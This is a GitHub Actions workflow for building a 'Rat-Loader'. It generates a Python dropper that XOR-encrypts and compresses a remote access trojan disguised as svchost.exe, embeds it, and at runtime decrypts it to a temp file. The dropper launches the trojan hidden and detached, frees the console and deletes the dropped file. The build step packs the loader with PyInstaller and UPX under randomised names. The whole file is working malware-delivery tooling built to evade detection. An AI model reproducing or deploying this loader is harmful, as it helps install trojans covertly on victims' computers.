name: Build Loader (Compact)

on:
  workflow_run:
    workflows: ["Build Python Rat EXE"]
    types:
      - completed
  workflow_dispatch:

jobs:
  build-loader:
    runs-on: windows-latest
    if: ${{ github.event.workflow_run.conclusion == 'success' || github.event_name == 'workflow_dispatch' }}
    
    steps:
      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'
      
      - name: Checkout code
        uses: actions/checkout@v4
      
      - name: Install dependencies
        run: |
          pip install pyinstaller
      
      - name: Install UPX
        run: choco install upx -y
      
      - name: Download artifact from main build
        if: ${{ github.event_name == 'workflow_run' }}
        uses: actions/download-artifact@v4
        with:
          name: Rat
          path: dist/
          github-token: ${{ secrets.GITHUB_TOKEN }}
          run-id: ${{ github.event.workflow_run.id }}
      
      - name: Create loader_builder.py
        run: |
          cat > loader_builder.py << 'EOF'
      import os
      import sys
      import subprocess
      import shutil
      import random
      import string
      import zlib
      import base64
      import time
      from pathlib import Path

      def generate_random_string(length=8):
          return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

      def create_python_loader(original_exe_path, output_dir):
          with open(original_exe_path, 'rb') as f:
              exe_data = f.read()
          
          compressed = zlib.compress(exe_data, level=9)
          key = os.urandom(32)
          encrypted = bytearray()
          for i, byte in enumerate(compressed):
              encrypted.append(byte ^ key[i % len(key)])
          
          data_b64 = base64.b64encode(encrypted).decode('ascii')
          key_b64 = base64.b64encode(key).decode('ascii')
          
          loader_code = f'''
      import sys
      import os
      import base64
      import zlib
      import tempfile
      import subprocess
      import ctypes
      import time
      import threading

      RAT_DATA = base64.b64decode("{data_b64}")
      XOR_KEY = base64.b64decode("{key_b64}")

      def xor_decrypt(data, key):
          decrypted = bytearray()
          for i, byte in enumerate(data):
              decrypted.append(byte ^ key[i % len(key)])
          return bytes(decrypted)

      def run_rat():
          try:
              decrypted = xor_decrypt(RAT_DATA, XOR_KEY)
              exe_data = zlib.decompress(decrypted)
              
              fd, path = tempfile.mkstemp(suffix='.exe')
              with os.fdopen(fd, 'wb') as f:
                  f.write(exe_data)
              
              startupinfo = subprocess.STARTUPINFO()
              startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
              startupinfo.wShowWindow = 0
              
              proc = subprocess.Popen(
                  [path],
                  startupinfo=startupinfo,
                  creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
              )
              
              def delete_later():
                  time.sleep(10)
                  try:
                      os.remove(path)
                  except:
                      pass
              
              threading.Thread(target=delete_later, daemon=True).start()
              return True
          except Exception as e:
              return False

      if __name__ == "__main__":
          if sys.platform == 'win32':
              ctypes.windll.kernel32.FreeConsole()
          run_rat()
      '''
          
          loader_path = os.path.join(output_dir, f'loader_{generate_random_string()}.py')
          with open(loader_path, 'w', encoding='utf-8') as f:
              f.write(loader_code)
          
          return loader_path

      def build_loader_with_pyinstaller(loader_path, output_dir):
          output_name = f'loader_{generate_random_string()}'
          cmd = [
              'pyinstaller',
              '--onefile',
              '--windowed',
              '--name', output_name,
              '--distpath', output_dir,
              '--workpath', os.path.join(output_dir, 'build'),
              '--specpath', output_dir,
              '--hidden-import', 'zlib',
              '--hidden-import', 'base64',
              '--hidden-import', 'threading',
              '--hidden-import', 'ctypes',
              '--hidden-import', 'tempfile',
              '--hidden-import', 'subprocess',
              loader_path
          ]
          
          subprocess.run(cmd, check=True, capture_output=True)
          
          for f in os.listdir(output_dir):
              if f.endswith('.exe') and f.startswith('loader_'):
                  return os.path.join(output_dir, f)
          return None

      def compress_with_upx(exe_path):
          try:
              subprocess.run(['upx', '--best', '--ultra-brute', exe_path], 
                            capture_output=True, check=True)
              return True
          except:
              return False

      def build_loader(original_exe_path):
          if not os.path.exists(original_exe_path):
              print(f"File not found: {original_exe_path}")
              return None
          
          output_dir = os.path.dirname(original_exe_path)
          
          print("Creating loader...")
          loader_py = create_python_loader(original_exe_path, output_dir)
          
          print("Building EXE...")
          loader_exe = build_loader_with_pyinstaller(loader_py, output_dir)
          
          if not loader_exe:
              print("Build failed")
              return None
          
          print("Compressing with UPX...")
          compress_with_upx(loader_exe)
          
          original_size = os.path.getsize(original_exe_path) / (1024 * 1024)
          final_size = os.path.getsize(loader_exe) / (1024 * 1024)
          
          print(f"Loader created!")
          print(f"Path: {loader_exe}")
          print(f"Size: {final_size:.1f} MB (from {original_size:.1f} MB)")
          
          try:
              os.remove(loader_py)
              shutil.rmtree(os.path.join(output_dir, 'build'), ignore_errors=True)
              shutil.rmtree(os.path.join(output_dir, '__pycache__'), ignore_errors=True)
              for f in os.listdir(output_dir):
                  if f.endswith('.spec'):
                      os.remove(os.path.join(output_dir, f))
          except:
              pass
          
          return loader_exe

      if __name__ == "__main__":
          exe_path = "dist/svchost.exe"
          if not os.path.exists(exe_path):
              print(f"EXE not found: {exe_path}")
              sys.exit(1)
          build_loader(exe_path)
      EOF
      
      - name: Build loader
        run: |
          python loader_builder.py
      
      - name: Upload loader
        uses: actions/upload-artifact@v4
        with:
          name: Rat-Loader
          path: dist/loader_*.exe
          retention-days: 7
      
      - name: Upload both versions
        uses: actions/upload-artifact@v4
        with:
          name: Rat-All
          path: |
            dist/svchost.exe
            dist/loader_*.exe
          retention-days: 7
